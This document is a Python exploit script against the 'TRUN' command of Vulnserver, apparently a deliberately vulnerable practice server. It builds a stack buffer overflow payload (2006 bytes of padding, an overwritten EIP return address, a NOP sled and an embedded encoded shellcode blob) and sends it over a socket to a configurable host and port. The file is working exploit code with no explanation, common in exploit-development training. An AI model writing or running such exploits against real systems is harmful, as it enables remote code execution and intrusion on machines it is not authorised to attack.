#!/usr/bin/python3

import socket

class VulnServer():

    def __init__(self, ip = '127.0.0.1', port = 4444):

        self.ip = ip
        self.port = port
        self.shellcode = (b"\xbb\x45\xa9\x5a\x23\xda\xc7\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
        b"\x52\x31\x5a\x12\x83\xc2\x04\x03\x1f\xa7\xb8\xd6\x63\x5f\xbe"
        b"\x19\x9b\xa0\xdf\x90\x7e\x91\xdf\xc7\x0b\x82\xef\x8c\x59\x2f"
        b"\x9b\xc1\x49\xa4\xe9\xcd\x7e\x0d\x47\x28\xb1\x8e\xf4\x08\xd0"
        b"\x0c\x07\x5d\x32\x2c\xc8\x90\x33\x69\x35\x58\x61\x22\x31\xcf"
        b"\x95\x47\x0f\xcc\x1e\x1b\x81\x54\xc3\xec\xa0\x75\x52\x66\xfb"
        b"\x55\x55\xab\x77\xdc\x4d\xa8\xb2\x96\xe6\x1a\x48\x29\x2e\x53"
        b"\xb1\x86\x0f\x5b\x40\xd6\x48\x5c\xbb\xad\xa0\x9e\x46\xb6\x77"
        b"\xdc\x9c\x33\x63\x46\x56\xe3\x4f\x76\xbb\x72\x04\x74\x70\xf0"
        b"\x42\x99\x87\xd5\xf9\xa5\x0c\xd8\x2d\x2c\x56\xff\xe9\x74\x0c"
        b"\x9e\xa8\xd0\xe3\x9f\xaa\xba\x5c\x3a\xa1\x57\x88\x37\xe8\x3f"
        b"\x7d\x7a\x12\xc0\xe9\x0d\x61\xf2\xb6\xa5\xed\xbe\x3f\x60\xea"
        b"\xc1\x15\xd4\x64\x3c\x96\x25\xad\xfb\xc2\x75\xc5\x2a\x6b\x1e"
        b"\x15\xd2\xbe\xb1\x45\x7c\x11\x72\x35\x3c\xc1\x1a\x5f\xb3\x3e"
        b"\x3a\x60\x19\x57\xd1\x9b\xca\x52\x26\xa3\x96\x0b\x24\xa3\xa7"
        b"\x70\xa1\x45\xcd\x96\xe4\xde\x7a\x0e\xad\x94\x1b\xcf\x7b\xd1"
        b"\x1c\x5b\x88\x26\xd2\xac\xe5\x34\x83\x5c\xb0\x66\x02\x62\x6e"
        b"\x0e\xc8\xf1\xf5\xce\x87\xe9\xa1\x99\xc0\xdc\xbb\x4f\xfd\x47"
        b"\x12\x6d\xfc\x1e\x5d\x35\xdb\xe2\x60\xb4\xae\x5f\x47\xa6\x76"
        b"\x5f\xc3\x92\x26\x36\x9d\x4c\x81\xe0\x6f\x26\x5b\x5e\x26\xae"
        b"\x1a\xac\xf9\xa8\x22\xf9\x8f\x54\x92\x54\xd6\x6b\x1b\x31\xde"
        b"\x14\x41\xa1\x21\xcf\xc1\xc1\xc3\xc5\x3f\x6a\x5a\x8c\xfd\xf7"
        b"\x5d\x7b\xc1\x01\xde\x89\xba\xf5\xfe\xf8\xbf\xb2\xb8\x11\xb2"
        b"\xab\x2c\x15\x61\xcb\x64")

        self.buffer = b'A' * 2006
        self.eip = b'\xaf\x11\x50\x62' 
        self.nop_sled = b'\x90' * 16
        self.final_pad = b'C' * (2500 - len(self.buffer) - len(self.eip) - len(self.nop_sled) - len(self.shellcode))
        self.attack_string = self.buffer + self.eip + self.nop_sled + self.shellcode + self.final_pad 

    def exploit(self):
        try:

            print('[*] Creating socket connection')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((self.ip,self.port))
            s.recv(1024)

            print('[*] Sending payload')
            s.send(b'TRUN .' + self.attack_string + b'\r\n')
    
            s.close()

        except Exception as e:
            print('There was an error: ' + str(e))
